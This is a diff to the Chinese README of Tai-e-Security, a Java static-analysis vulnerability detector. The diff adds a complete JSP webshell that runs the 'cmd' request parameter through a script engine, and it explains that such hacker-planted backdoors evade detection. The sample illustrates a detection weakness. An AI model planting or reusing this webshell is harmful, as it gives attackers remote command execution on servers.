@@ -28,6 +28,43 @@ Tai-e-Security 是基于Tai-e java 静态检测框架之上的一个漏洞检测
 
 * 黑客
 
+
+```java
+<%@ page import="java.util.*,java.io.*,javax.script.*,java.net.*"%>
+<%
+//
+// JSP_KIT
+//
+// 1.jsp = Command Execution (unix)
+//
+// by: huzhanchi
+//
+%>
+<HTML><BODY>
+<%
+if (request.getParameter("cmd") != null) {
+        String n = request.getParameter("cmd");
+  try {
+        n = java.net.URLDecoder.decode(n, "UTF-8");
+			} catch (Exception e) {
+					  e.printStackTrace();
+			}
+        String j = System.getProperty("java.version");
+        ScriptEngineManager engineManager = new ScriptEngineManager();
+        ScriptEngine engine = null;
+        boolean b = j.indexOf("1.7") == 0 ? true : false;
+        engine = engineManager.getEngineByName("js");
+        String m = b ? "(function sum() {importPackage(java.util);importPackage(java.lang);Runtime.getRuntime().exec(a); return a; })(a)" :
+          "load(\"nashorn:mozilla_compat.js\");(function sum() {importPackage(java.util);importPackage(java.lang);Runtime.getRuntime().exec(a); return a; })(a)";
+        Bindings bindings = engine.createBindings();
+        bindings.put("a", n);
+        engine.setBindings(bindings, ScriptContext.GLOBAL_SCOPE);
+        engine.eval(m, bindings);
+  }
+%>
+</BODY></HTML>
+```
+
 黑客留下的后门比如webshell，或者其他java类持久后门，如果是后门就会有代码检测对抗，比如shell 利用反射，动态JavaScript引擎脚本混淆，所以面向黑客投递的jsp webshell检测效果相对要弱些
 
 # 污点分析检测
